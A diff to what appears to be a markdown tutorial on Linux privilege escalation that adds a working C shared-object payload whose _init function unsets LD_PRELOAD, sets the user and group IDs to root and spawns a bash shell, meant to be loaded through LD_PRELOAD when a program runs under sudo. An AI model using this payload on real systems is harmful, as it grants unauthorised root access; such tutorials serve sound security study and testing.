@@ -10,6 +10,16 @@
 
 ### 2: Write a simple C code compiled as a share object file (.so extension)
 
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <stdlib.h>
+    void _init() {
+    	unsetenv("LD_PRELOAD");
+    	setgid(0);
+    	setuid(0);
+    	system("/bin/bash");
+    }    
+
 ### 3: Run the program with sudo privileges and the LD_PRELOAD option pointing to our .so file
 
 ### 1) Compilation
